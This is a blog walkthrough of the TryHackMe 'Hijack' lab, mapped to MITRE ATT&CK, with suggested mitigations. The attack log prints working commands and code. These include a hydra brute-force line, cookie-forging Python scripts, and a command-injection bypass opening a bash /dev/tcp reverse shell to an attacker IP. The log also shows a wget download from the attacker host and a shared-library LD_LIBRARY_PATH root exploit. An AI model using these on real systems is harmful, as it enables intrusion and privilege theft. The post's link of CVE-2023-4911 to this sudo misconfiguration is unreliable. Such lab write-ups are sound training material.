---
title: "TryHackMe - Hijack"
categories:
  - Blog
tags:
  - TryHackMe
  - CTF
  - Training
  - MITRE ATT&CK
toc: true
toc_sticky: true
---

This is a walkthrough of the [Hijack room on TryHackMe.](https://tryhackme.com/room/hijack).

# Overview
<a href="/projectpage/assets/images/hijack-nav-layer.png"><img src="/projectpage/assets/images/hijack-nav-layer.png"></a>
The attacker's primary tactics consisted of reconnaissance, collection, credential access, resource development, initial access, privilege escalation and persistence. This overview will cover the techniques and sub-techniques that were used during the attack, pointing out vulnerabilities as defined by OWASP where applicable. Following this overview, mitigation measures will be suggested. For additional technical information, the attacker's notes are included after the suggested mitigations.

The attacker began conducting reconnaissance through actively scanning the target's IP address using Nmap (T1595.001). From this activity, the attacker enumerated several services which would prove useful at further stages of their attack. The presence of the HTTP service running on port 80 led the attacker to explore the victim owned website (T1595.001). Due to improper error handling at `/signup.php`, the attacker was able to determine the existence of the username "admin". A similar vulnerability was found at `/login.php`.

This type of vulnerability constitutes a security misconfiguration, defined by OWASP as [A05 - Security Misconfiguration.](https://owasp.org/Top10/A05_2021-Security_Misconfiguration/)
It should be noted, that the website does implement a lockout period after too many incorrect login attempts, which mitigated the attacker's attempted brute-forcing of the login page.

The attacker then pivoted to the rpcbind and nfs services. The attacker was able to mount the nfs directory to their own machine. Then, by impersonating the directory's owner's UID, the attacker gained access to the data on this shared drive (T1039), including unsecured credentials to the FTP service (T1552.001). Further collection and credential access was accomplished by accessing the FTP service. In all, the attacker now had a list of possible passwords for two potential users - "admin" and "rick".

Following this phase, the attacker began developing resources. The attacker attempted to use the website's improper error handling to confirm the validity of the username "rick", however the user did not already exist here. They created the account and inspected the login POST request, to find that the website makes use of a cookie, PHPSESSID, for authentication. This particular cookie is known to be an exploitable vulnerability (T1588.006).
The attacker was able to reverse engineer the PHPSESSID and create Python scripts to forge the website's cookie (T1606.001), and then successfully brute-forced their way to `/administration.php`.

This exploitation reveals two vulnerabilities defined by OWASP: [A04 Insecure Design](https://owasp.org/Top10/A04_2021-Insecure_Design/) and [A05 Security Misconfiguration](https://owasp.org/Top10/A05_2021-Security_Misconfiguration/).

The next phase of this attack resulted in initial access via exploiting the web application at `/administration.php` (T1190). The attacker determined that they were able to use this web page to execute arbitrary code on the host system, and used this vulnerability to send a reverse shell to their local machine.

It should be noted, that the web application's behavior does indicate some input validation, however this was trivial to overcome.

The attacker then used the well-known tool, linPEAS, to explore privilige escalation vulnerabilities on the host (T1588.002). This tool indicated more unsecured credentials in the file `/var/www/html/config.php` (T1552.001). This discovery provided the valid account of "rick" (T1078.003) for privilege escalation, as well as persistence - as the attacker was now capable of accessing the host via SSH.

Finally, the attacker pivoted to escalate their privilege to root. The attacker determined that as the user "rick" they were able to hijack the execution flow of the `apache2` binary (T1574.006), and alter the PATH envirnment variable (T1574.007), to redirect it to a bogus C file which spawns a shell. The user "rick" has permission to run `apache2` as root, and when this occurs the shell maintains root privileges.

# Suggested Mitigations
Starting at the beginning of the attack, the first suggested mitigation is against Nmap. There are several methods suggested by nmap.org, the most important of which are [blocking and slowing nmap with firewalls](https://nmap.org/book/nmap-defenses-firewalls.html), and [detecting nmap scans](https://nmap.org/book/nmap-defenses-detection.html) with tools like PortSentry or Scanlogd.

Secondly, the host contains several instances of unsecured credentials. The mitigations for this vulnerability includes auditing the system for files containing passwords, as well administrative controls to prohibit storing passwords in files and user training.

This host presented several web application vulnerabilities as defined by OWASP - insecure design and security misconfigurations. 
- To address the insecure design, OWASP suggests renaming the session ID token to something generic and use a cryptographically secure pseudorandom number generator (CSPRNG) with a size of at least 128 bits for the value. 
- The security misconfiguration of improper error handling should be addressed by making login errors more generic, to not provide information to malicious actors.

The `/administration.php` page presents the ability to execute arbitrary commands on the host system. There already appears to have some input validation in place, but this needs to be tuned further. The suggested mitigation is to deny by default any input that is not an enabled service on the host by implementing a white-list. 

There does not appear to be any known mitigation for the LD_LIBRARY_PATH vulnerability yet. The vulnerability has been assigned [CVE-2023-4911](https://nvd.nist.gov/vuln/detail/CVE-2023-4911). Purportedly some security technologies such as Falco can detect this behavior.

# Attack: Sequence of Events
## Tactic: Reconnaissance:
### Technique: Active Scanning: Scanning IP Blocks(T1595.001)
I began with active reconnaissance of the target by using Nmap:
```bash
$ nmap -sV < TARGET IP >

PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
111/tcp  open  rpcbind 2-4 (RPC #100000)
2049/tcp open  nfs     2-4 (RPC #100003)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
After enumerating the open ports and services on the host I began assessing each for vulnerabilities.

### FTP (21)
I tested the FTP service for Anonymous login capabilities. This attack vector appears to be unavailable:
```bash
$ ftp < TARGET IP >
Connected to < TARGET IP >.
220 (vsFTPd 3.0.3)
Name (< TARGET IP >:kali): Anonymous
331 Please specify the password.
Password:
530 Login incorrect.
ftp: Login failed
```

### HTTP (80)
#### Technique: Search Victim-Owned Websites(T1594)
I began testing the HTTP service by performing a simple walkthrough of the web application. At `/signup.php` I attempted to create a user named "admin" and was informed "This username is already taken." 

I navigated to the login page and attempted logging in with username "test" and password "test." This resulted in an error message: "The username and password are not valid." I then changed the username to "admin" and the error changed to: "The password you entered is not valid."

I then attempted to brute force the login form at `/login.php`:
```bash
$ hydra -l admin -P /usr/share/wordlists/rockyou.txt < TARGET IP > http-post-form "/login.php:username=^USER^&password=^PASS^:The password you entered is not valid."
```

This proved to be unsuccessful as the login form implements a lockout after too many incorrect attempts.

I also clicked the link to `/administration.php` but received the error message: Access denied.

## Tactics: Collection, Credential Access, Resource Development
### Techniques: Data from Network Shared Drive(T1039), Unsecured Credentials: Credentials In Files(T1552.001)
#### rpcbind/nfs(111, 2049)
I performed an additional scan with Nmap against the rpcbind service on port 111:
```bash
$ nmap -A -p 111 < TARGET IP > --badsum
111/tcp  open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  2,3,4       2049/udp   nfs
|   100003  2,3,4       2049/udp6  nfs
|   100005  1,2,3      34123/tcp   mountd
|   100005  1,2,3      37644/tcp6  mountd
|   100005  1,2,3      52764/udp   mountd
|   100005  1,2,3      59297/udp6  mountd
|   100021  1,3,4      33932/tcp6  nlockmgr
|   100021  1,3,4      34822/udp   nlockmgr
|   100021  1,3,4      37268/udp6  nlockmgr
|   100021  1,3,4      39531/tcp   nlockmgr
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
```
The presence of rpcbind and nfs led me to the following resource: https://book.hacktricks.xyz/network-services-pentesting/nfs-service-pentesting

First, I checked for the mountable folder on the server:
```bash
$ showmount -e < TARGET IP >
Export list for < TARGET IP >:
/mnt/share *
```
Next, I attempted to mount the folder, and was successful:
```bash
$ sudo mount -t nfs 10.10.88.122:/mnt/share /tmp/hijack -o nolock
$ ls -la /tmp
drwx------  2 1003 1003      4096 Aug  8 15:28 hijack
```
From this, I can see that the folder was successfully mounted, however I do not have permission to view its contents. In this case, a user with a UID of 1003 does have permission. So, I first unmounted the folder, then created "newuser" with UID 1003:
```bash
$ sudo umount /home/kali/hijack       
$ sudo useradd newuser
$ sudo usermod -u 1003 newuser
```
Then I mounted the folder once again, then changed to newuser so I could access its contents:
```bash
$ sudo mount -t nfs 10.10.88.122:/mnt/share /tmp/hijack -o nolock
$ su newuser
$ ls -la /tmp/hijack
-rwx------  1 newuser 1003   46 Aug  8 15:28 for_employees.txt
```
Now that I have access, I changed the permissions of `for_emplyees.txt` and copied it to `/tmp`
```bash
$ chmod 777 /tmp/for_employees.txt
$ cp /tmp/for_employees.txt /tmp/for_employees.txt
```
This text file provided credentials for the FTP service:
```bash
$ cat for_employees.txt
ftp creds :

ftpuser:W3stV1rg1n14M0un741nM4m4
```
#### FTP (21)
With credentials for the valid account, ftpuser, I pivoted back to the FTP service:
```bash
$ ftp 10.10.88.122
Connected to 10.10.88.122.
220 (vsFTPd 3.0.3)
Name (10.10.88.122:kali): ftpuser
331 Please specify the password.
Password:
230 Login successful.

ftp> ls -la

drwxr-xr-x    2 1002     1002         4096 Aug 08 19:28 .
drwxr-xr-x    2 1002     1002         4096 Aug 08 19:28 ..
-rwxr-xr-x    1 1002     1002          220 Aug 08 19:28 .bash_logout
-rwxr-xr-x    1 1002     1002         3771 Aug 08 19:28 .bashrc
-rw-r--r--    1 1002     1002          368 Aug 08 19:28 .from_admin.txt
-rw-r--r--    1 1002     1002         3150 Aug 08 19:28 .passwords_list.txt
-rwxr-xr-x    1 1002     1002          655 Aug 08 19:28 .profile
```
I was unable to exfiltrate the text files, but did have read permission:
```bash
ftp> less /.from_admin.txt
To all employees, this is "admin" speaking,
i came up with a safe list of passwords that you all can use on the site, these passwords don't appear on any wordlist i tested so far, so i encourage you to use them, even me i'm using one of those.

NOTE To rick : good job on limiting login attempts, it works like a charm, this will prevent any future brute forcing.
```
I used `less` to view the contents of `.passwords_list.txt` and copied the list from the terminal to a new local file I created called `passwords_list.txt`. Along with the password list, this also enumerates another potential username: rick.

### Techniques: Obtain Capabilities: Vulnerabilities(T1588.006), Develop Capabilities: Exploits(T1587.004)
I turned back to the web service, and checked to see if the username "rick" was already taken. The username was not taken, so I went ahead and finished creating this account, with the password: password. I logged in as rick and caught the request and response with Burp Suite's intercept.

I noticed that the request contained the following cookie value: `PHPSESSID=cmljazo1ZjRkY2MzYjVhYTc2NWQ2MWQ4MzI3ZGViODgyY2Y5OQ` 

I did some research on this cookie and found the following resource: https://www.exploit-db.com/papers/15990

While this exploit makes clear that prediction of another user's cookie is very difficult, I do already have a valid cookie captured, and so I decided to dig into it. I pasted the `PHPSESSID` into [CyberChef](https://gchq.github.io/CyberChef/) and it immediately recognized the value as Base64 encoded. I decoded it to find the following value:
`rick:5f4dcc3b5aa765d61d8327deb882cf99`.

Next, I took the hash `5f4dcc3b5aa765d61d8327deb882cf99` to [Crack Station](https://crackstation.net/), which determined it was an MD5 hash of my user's password: password.

With this information, I created two Python scripts. The first is to create an MD5 hash of each line in `passwords_list.txt`:
```python
import hashlib

with open("passwords_list.txt", mode="r", encoding="utf-8") as f:
    for line in f:
        line = line.rstrip("\r\n")
        result = hashlib.md5(line.encode())
        print(result.hexdigest())
```

Then I copied the output to a new file called `hashedpasswords.txt`, and created the following Python script to append each hash with "admin:" and encode the string in Base64:
```python
import base64

with open("hashedpasswords.txt", mode="r", encoding="utf-8") as f:
        for line in f:
                result = f"admin:{line}"
                encodedstr = base64.b64encode(result.encode())
                decodedstr = encodedstr.decode('utf-8')
                finalstr = decodedstr[:-1]
                print(finalstr) 
```
I copied the output to a new file called `payloads.txt`.

### Technique: Forge Web Credentials: Web Cookies(T1606.001)
In order to gain access to the administrator page I used Burp Suite. First, I signed in as "rick" again, and attempted to access `/administration.php`. I caught the request with intercept and sent it to intruder. Then I turned the PHPSESSID value into the payload variable. For the payload options, I added `payloads.txt` as a simple list, and turned on grep match for the string "Access denied."

I ran the payload and found the result which did not grep match the defined string: `YWRtaW46ZDY1NzNlZDczOWFlN2ZkZmIzY2VkMTk3ZDk0ODIwYTU`

I then went back to intercept, pasted in the admin user's `PHPSESSID` and clicked forward. I was now able view `/administration.php`

## Tactic: Initial Access
### Technique: Exploit Public-Facing Application(T1190)
The page at `/administration.php` features a "Service Status Checker" which consists of a text box and a "submit" button. I first tested its functionality by entering "ftp", which returned:
```bash
* ftp.service
   Loaded: not-found (Reason: No such file or directory)
   Active: inactive (dead)
```

I then tested this for arbitrary command execution by appending "ftp" with "`&& cat /etc/passwd`". This returned:
```bash
* ftp.service
   Loaded: not-found (Reason: No such file or directory)
   Active: inactive (dead)
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
messagebus:x:107:111::/var/run/dbus:/bin/false
uuidd:x:108:112::/run/uuidd:/bin/false
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
pollinate:x:111:1::/var/cache/pollinate:/bin/false
vagrant:x:1000:1000:,,,:/home/vagrant:/bin/bash
ftp:x:112:118:ftp daemon,,,:/srv/ftp:/bin/false
mysql:x:113:119:MySQL Server,,,:/nonexistent:/bin/false
statd:x:114:65534::/var/lib/nfs:/bin/false
ftpuser:x:1002:1002:,,,:/home/ftpuser:/bin/bash
rick:x:1003:1003::/home/rick:
```
*Note: `/etc/passwd` shows that "rick" is a user on the host system.*

I then used Reverse Shell Generator to create a bash script, and appended the "ftp" request with "`&& /bin/bash -i >& /dev/tcp/<ATTACKER IP>/9999 0>&1`". Then I started a netcat listener on my local machine:
```bash
$ nc -lvnp 9999
```

The web application appears to have some input validation in place though, as I received an error the command injection was detected. However, this was easily circumvented by changing my request to "ftp && bash -c '/bin/bash -i >& /dev/tcp/<ATTACKER IP>/9999 0>&1'", and I obtained a shell on my local machine.
```bash
www-data@Hijack:/var/www/html$ whoami
whoami
www-data
```
## Tactics: Resource Development, Credential Access
### Technique: Obtain Capabilities: Tool(T1588.002)
Next I turned to a familiar tool to explore potential avenues for privilege escalation, linPEAS. I already have `linpeas.sh` on my local machine, so I navigated to its directory and started an HTTP server with Python on port 8888:
```bash
$ python3 -m http.server 8888
``` 

Then on the target, I navigated to `/tmp` and used `wget` to download `linpeas.sh`:
```bash
www-data@Hijack:/home/ftpuser$ cd /tmp
cd /tmp
www-data@Hijack:/tmp$ wget http://<ATTACKER IP>:8888/linpeas.sh
wget http://<ATTACKER IP>:8888/linpeas.sh
--2023-12-07 17:03:39--  http://<ATTACKER IP>:8888/linpeas.sh
Connecting to <ATTACKER IP>:8888... connected.
HTTP request sent, awaiting response... 200 OK
Length: 847815 (828K) [text/x-sh]
Saving to: 'linpeas.sh'

linpeas.sh          100%[===================>] 827.94K   803KB/s    in 1.0s    

2023-12-07 17:03:40 (803 KB/s) - 'linpeas.sh' saved [847815/847815]
```
Next, I made `linpeas.sh` executable, and ran it:
```bash 
www-data@Hijack:/tmp$ chmod +x linpeas.sh
chmod +x linpeas.sh
www-data@Hijack:/tmp$ ./linpeas.sh
```

### Technique: Unsecured Credentials: Credentials In Files(T1552.001)
After the script finished, I found the following interesting results:
```bash
╔══════════╣ Searching passwords in config PHP files
/var/www/html/config.php:$password = "N3v3rG0nn4G1v3Y0uUp";
```

I used `cat` to read the contents of this file:
```bash
www-data@Hijack:/tmp$ cat /var/www/html/config.php
cat /var/www/html/config.php
<?php
$servername = "localhost";
$username = "rick";
$password = "N3v3rG0nn4G1v3Y0uUp";
$dbname = "hijack";

// Create connection
$mysqli = new mysqli($servername, $username, $password, $dbname);

// Check connection
if ($mysqli->connect_error) {
  die("Connection failed: " . $mysqli->connect_error);
}
?>
```
Once again, unsecured credentials have been found in a file.

## Tactics: Privilege Escalation, Persistence
### Technique: Valid Accounts: Local Accounts(T1078.003)
Next, I confirmed the validity of these credentials and the privilege escalation:
```bash
www-data@Hijack:/tmp$ su rick
su rick
Password: N3v3rG0nn4G1v3Y0uUp

rick@Hijack:/tmp$ 
```
To demonstrate the element of persistence I connected via SSH as the user rick as well.

After this I obtained the flag from `/home/rick/user.txt`:
```bash
rick@Hijack:~$ cat user.txt
cat user.txt
THM{REDACTED}
```

### Techniques: Hijack Execution Flow: Dynamic Linker Hijacking(T1574.006), Hijack Execution Flow: Path Interception by PATH Environment Variable(T1574.007)
For privelege escalation to root, I began by running the following command to check for rick's sudo privileges:
```bash
rick@Hijack:~$ sudo -l
[sudo] password for rick: 
Matching Defaults entries for rick on Hijack:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    env_keep+=LD_LIBRARY_PATH

User rick may run the following commands on Hijack:
    (root) /usr/sbin/apache2 -f /etc/apache2/apache2.conf -d /etc/apache2
```

I researched `env_keep` and `LD_LIBRARY_PATH` and found the following resource: https://atom.hackstreetboys.ph/linux-privilege-escalation-environment-variables/

Following along with the process described, I first ran the following:
```bash
rick@Hijack:~$ ldd /usr/sbin/apache2
        linux-vdso.so.1 =>  (0x00007ffd9a3b9000)
        libpcre.so.3 => /lib/x86_64-linux-gnu/libpcre.so.3 (0x00007f0a3a511000)
        libaprutil-1.so.0 => /usr/lib/x86_64-linux-gnu/libaprutil-1.so.0 (0x00007f0a3a2ea000)
        libapr-1.so.0 => /usr/lib/x86_64-linux-gnu/libapr-1.so.0 (0x00007f0a3a0b8000)
        libpthread.so.0 => /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007f0a39e9b000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f0a39ad1000)
        libcrypt.so.1 => /lib/x86_64-linux-gnu/libcrypt.so.1 (0x00007f0a39899000)
        libexpat.so.1 => /lib/x86_64-linux-gnu/libexpat.so.1 (0x00007f0a39670000)
        libuuid.so.1 => /lib/x86_64-linux-gnu/libuuid.so.1 (0x00007f0a3946b000)
        libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007f0a39267000)
        /lib64/ld-linux-x86-64.so.2 (0x00007f0a3aa26000)
```

I chosed `libcrypt.so.1` to hijack, and created the following file at `/tmp/exploit.c`:
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

Then, I compiled my script and output it to `/tmp/libcrypt.so.1`:
```bash
rick@Hijack:~$ gcc -o /tmp/libcrypt.so.1 -shared -fPIC /tmp/exploit.c
```
Finally, I ran `apache2` with `sudo`, while while settings the `LD_LIBRARY_PATH` environment variable to `/tmp`:
```bash
rick@Hijack:~$ sudo LD_LIBRARY_PATH=/tmp /usr/sbin/apache2 -f /etc/apache2/apache2.conf -d /etc/apache2
```

As described, the process results in escalation to root:
```bash
root@Hijack:/tmp# whoami
root
```
Finally, with root access, I am able to obtain the flag at `/root/root.txt`:
```bash
root@Hijack:/root# cat root.txt 

██╗░░██╗██╗░░░░░██╗░█████╗░░█████╗░██╗░░██╗
██║░░██║██║░░░░░██║██╔══██╗██╔══██╗██║░██╔╝
███████║██║░░░░░██║███████║██║░░╚═╝█████═╝░
██╔══██║██║██╗░░██║██╔══██║██║░░██╗██╔═██╗░
██║░░██║██║╚█████╔╝██║░░██║╚█████╔╝██║░╚██╗
╚═╝░░╚═╝╚═╝░╚════╝░╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝

THM{REDACTED}
```